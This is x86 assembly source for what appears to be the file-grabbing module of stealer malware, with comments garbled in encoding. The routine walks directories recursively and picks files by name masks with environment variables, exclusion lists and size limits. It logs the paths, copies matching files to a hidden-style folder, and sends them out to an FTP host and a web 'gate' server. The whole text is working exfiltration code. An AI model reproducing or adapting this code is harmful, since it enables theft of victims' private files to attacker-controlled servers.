files_grab_start:

find_files proc                                               ; ����������� ���������
      push    ebp                                             ; ������� ����� � �����
      mov     ebp,esp                                         ; ��� ����� ������
      sub     esp,144h                                        ; � ��������� WIN32_FIND_DATA
      lea     eax,[ebp-144h]                                  ; ��������� ��������� �� find_data
      FindFirstFile,offset buf,eax                    ; ���� �����
      inc     eax                                             ; ���� ������
      je      exit_now
      dec     eax                                             ; �����, ��������
      mov     dword ptr [ebp-6h],eax                          ; ����� ������
find_next:
      mov     eax,dword ptr [ebp-144h]                        ; ���������, �����
      and     eax,FILE_ATTRIBUTE_DIRECTORY                    ; ����������?
      je      found                                           ; ���� ��� - ������� �� found
      
      lea     eax,[ebp-118h]                                  ; �������� ��������� �� cFileName
      lstrcmp,offset fake1,eax                        ; ��� "."?
      test    eax,eax                                         ; ���� ��,
      je      next                                            ; ���� ������
      lea     eax,[ebp-118h]                                  ; �������� ��������� �� cFileName
      lstrcmp,offset fake2,eax                        ; ��� ".."?
      test    eax,eax                                         ; ���� ��,
      je      next                                            ; ���� ������
      
      push    offset buf
      call    _PathFindFileName
      sub     eax, offset buf
      push    eax                                             ; �������� ���������� �����
      mov     byte ptr [buf+eax],0                            ; ���� �� ��-���� �����
      
      lea     eax,[ebp-118h]                                  ; ����������, �� ��������
      lstrcat,offset buf,eax                          
      lstrlen,offset buf                              ; �������� ����� ������
      mov     dword ptr [buf+eax],'*.*\'                      ; �������� \*.* 
      mov     byte ptr [buf+eax+4],0                          ; ��� ������
      call    find_files                                      ; �������� ��������� ������
      pop     eax                                             ; ����������� ����� ������
      mov     dword ptr [buf+eax-1],'*.*\'                    ; � ����������� \*.*
      mov     byte ptr [buf+eax+3],0                          ;
      jmp     next                                            ; ���� ������
      
found:
      push    offset buf
      call    _PathFindFileName
      sub     eax, offset buf
      mov     byte ptr [buf+eax],0
      
      lea     ebx, [ebp-118h]
      lstrcat, addr buf, ebx
      
      mov     ecx, dword ptr [words_number]
      mov     edi, dword ptr [namespace]
      add     edi, 4
words_names_loop:
      push    ecx
      movzx   eax, byte ptr [edi]
      .if     ( eax == '%' )
              push    edi
              mov     ecx, edi
              inc     ecx
              per_srch:
              mov     al, byte ptr [ecx]
              .if     ( al == '%' )
                      ;inc     ecx
                      jmp     per_fnded
              .endif
              inc     ecx
              jmp     per_srch
              per_fnded:
              push    ecx
              sub     ecx, edi
              inc     edi
              lstrcpyn, addr TmpBuf, edi, ecx
              GetEnvironmentVariable, addr TmpBuf, addr TmpBuf2, sizeof TmpBuf2
              pop     ecx
              inc     ecx
              lstrcat, addr TmpBuf2, ecx
              push    offset TmpBuf2
              push    offset buf
              call    _PathMatchSpec
              pop     edi
      .elseif
              push    edi
              push    offset buf
              call    _PathMatchSpec
      .endif
      cmp     eax, 1
      pushfd
      lstrlen, edi
      add     edi, eax
      inc     edi
      mov     eax, dword ptr [edi+00h]
      mov     [MIN], eax
      mov     eax, dword ptr [edi+04h]
      mov     [MAX], eax
      popfd
      je      fileisgood
      pop     ecx ; min + max
      add     edi, 4 + 4
      dec     ecx
      jne     words_names_loop
      jmp     next

fileisgood:      
      mov     edi, dword ptr [exspace]
      test    edi, edi
      je      is_good_and_not_excluded
      mov     ecx, dword ptr [edi] ; count of exclude masks
      add     edi, 4
      test    ecx, ecx
      je      is_good_and_not_excluded
ex_names_loop:
      push    ecx
      movzx   eax, byte ptr [edi]
      .if     ( eax == '%' )
              push    edi
              mov     ecx, edi
              inc     ecx
              exper_srch:
              mov     al, byte ptr [ecx]
              .if     ( al == '%' )
                      ;inc     ecx
                      jmp     exper_fnded
              .endif
              inc     ecx
              jmp     exper_srch
              exper_fnded:
              push    ecx
              sub     ecx, edi
              inc     edi
              lstrcpyn, addr TmpBuf, edi, ecx
              GetEnvironmentVariable, addr TmpBuf, addr TmpBuf2, sizeof TmpBuf2
              pop     ecx
              inc     ecx
              lstrcat, addr TmpBuf2, ecx
              push    offset TmpBuf2
              push    offset buf
              call    _PathMatchSpec
              pop     edi
      .elseif
              push    edi
              push    offset buf
              call    _PathMatchSpec
      .endif
      cmp     eax, 1
      je      next
      lstrlen, edi
      add     edi, eax
      inc     edi
      pop     ecx 
      dec     ecx
      jne     ex_names_loop

is_good_and_not_excluded:
      mov     cnt, 0 
      lstrcpy, addr cpyfrom, addr buf
      lstrcpy, addr cpyto, addr const_d
      lstrcat, addr cpyto, addr sl
      
      lstrcat, addr cpyto, addr UniqDirName
      lstrcat, addr cpyto, addr strike
      
      lea     eax,[ebp-118h]
      lstrcat, addr cpyto, eax
      
      lstrcpy, addr cur_d, addr cpyfrom
      push    offset cur_d
      call    _PathFindFileName
      mov     byte ptr [eax-1], 0
      lstrcmpi, addr cur_d, addr const_d
      test    eax, eax
      je      next
      
      lstrlen, addr FTP_HOST
      .if     ( eax != 0 )
              check_ex_ftp:     
              push    offset cpyto
              call    _PathFindFileName
              push    0
              push    FTP_TRANSFER_TYPE_BINARY
              push    GENERIC_READ
              push    eax
              push    dword ptr [hFtp]
              call    dword ptr [_FtpOpenFile]
              mov     t_hndl, eax
              GetLastError
              .if     (eax!=00002EE3h)
                      push    dword ptr [t_hndl]
                      call    dword ptr [_InternetCloseHandle]
                      
                      inc     dword ptr [cnt]
                      push    offset cpyto
                      call    _PathFindExtension
                      push    eax
                      lstrlen, eax
                      add     eax, 1
                      pop     ecx
                      lstrcpyn, addr ext, ecx, eax
                      lstrcpy, addr cpyt2, addr cpyto
                      lstrlen, addr cpyt2
                      push    eax
                      mov     eax, dword ptr [cnt]
                      .if     (eax == 1)
                              pop     eax
                              push    offset cpyt2
                              call    _PathFindExtension
                              mov     byte ptr [eax], 0
                      .elseif
                              pop     eax
                              dec     eax
                              mov     esi, offset cpyt2
                              add     esi, eax
                          fuck_but_not_skoba_ftp:         
                              cmp     byte ptr [esi], 5Fh
                              je      fnd_sk_ftp
                              dec     esi
                              jmp     fuck_but_not_skoba_ftp
                          fnd_sk_ftp:
                              mov     byte ptr [esi], 0 
                      .endif
              .elseif
                              jmp     skip_renaming
              .endif      
              lstrcat, addr cpyt2, addr skob1
              
              mov     eax, dword ptr [cnt]
              push    eax
              push    offset format_str
              push    offset nmb
              call    wsprintf
              add     esp, 3*4
              
              lstrcat, addr cpyt2, addr nmb
              lstrcat, addr cpyt2, addr ext
              lstrcpy, addr cpyto, addr cpyt2
              jmp     check_ex_ftp
      .else
              jmp     check_ex_flash
      .endif
      
check_ex_flash:
      mov     eax, dword ptr [DirNameCreateLen]
      .if     ( eax != 0 )
              check_ex:      
              CreateFile, addr cpyto, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
              mov     t_hndl, eax
              GetLastError
              .if     (eax!=ERROR_FILE_NOT_FOUND)
                      CloseHandle, t_hndl
                      inc     dword ptr [cnt]
                      push    offset cpyto
                      call    _PathFindExtension
                      push    eax
                      lstrlen, eax
                      add     eax, 1
                      pop     ecx
                      lstrcpyn, addr ext, ecx, eax
                      lstrcpy, addr cpyt2, addr cpyto
                      lstrlen, addr cpyt2
                      push    eax
                      mov     eax, dword ptr [cnt]
                      .if     (eax == 1)
                              pop     eax
                              push    offset cpyt2
                              call    _PathFindExtension
                              mov     byte ptr [eax], 0
                      .elseif
                              pop     eax
                              dec     eax
                              mov     esi, offset cpyt2
                              add     esi, eax
                              fuck_but_not_skoba:         
                              cmp     byte ptr [esi], 5Fh
                              je      fnd_sk
                              dec     esi
                              jmp     fuck_but_not_skoba
                              fnd_sk:
                              mov     byte ptr [esi], 0 
                      .endif
                              
                      lstrcat, addr cpyt2, addr skob1
                      push    dword ptr [cnt]
                      push    offset format_str
                      push    offset nmb
                      call    wsprintf
                      add      esp, 3*4
                      lstrcat, addr cpyt2, addr nmb
                      lstrcat, addr cpyt2, addr ext
                      lstrcpy, addr cpyto, addr cpyt2
                      jmp     check_ex
              .endif
      .endif
                      ; get filesize
                      skip_renaming:
                      CreateFile, addr cpyfrom, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
                      mov     ebx, eax
                      GetFileSize, ebx, NULL
                      mov     esi, eax
                      CloseHandle, ebx
                      
                      ; compare filesize with min and max
                      mov     eax, [MIN]
                      test    eax, eax
                      je      good1
                      cmp     esi, eax
                      jl      size_not_match
                      good1:
                      mov     eax, [MAX] 
                      test    eax, eax
                      je      good2
                      cmp     esi, eax
                      jg      size_not_match  
                      good2:
                      
                      lstrlen, addr cpyfrom
                      WriteFile, hFList, addr cpyfrom, eax, addr nw, NULL
                      WriteFile, hFList, addr log_rozd, sizeof log_rozd-1, addr nw, NULL
                      push    offset cpyto
                      call    _PathFindFileName
                      mov     ebx, eax
                      lstrlen, ebx
                      WriteFile, hFList, ebx, eax, addr nw, NULL
                      WriteFile, hFList, addr crlf, 2, addr nw, NULL
                      
                      mov     eax, dword ptr [DirNameCreateLen]
                      .if     ( eax != 0 )
                              CopyFile, addr cpyfrom, addr cpyto, 0
                      .endif
                      
                      lstrlen, addr FTP_HOST
                      .if     ( eax != 0 )
                              call    FTP_SEND
                      .endif
                      
                      mov     eax, dword ptr [GateHostSize]
                      .if     ( eax != 0 )
                              pushad
                              call    GATE_SEND
                              popad
                      .endif
              size_not_match:     

next:
      lea     eax,[ebp-144h]
      FindNextFile,dword ptr [ebp-6h],eax
      test    eax,eax
      jne     find_next

      FindClose, dword ptr [ebp-6h]
exit_now:
      leave
      ret
find_files endp

files_grab_end:
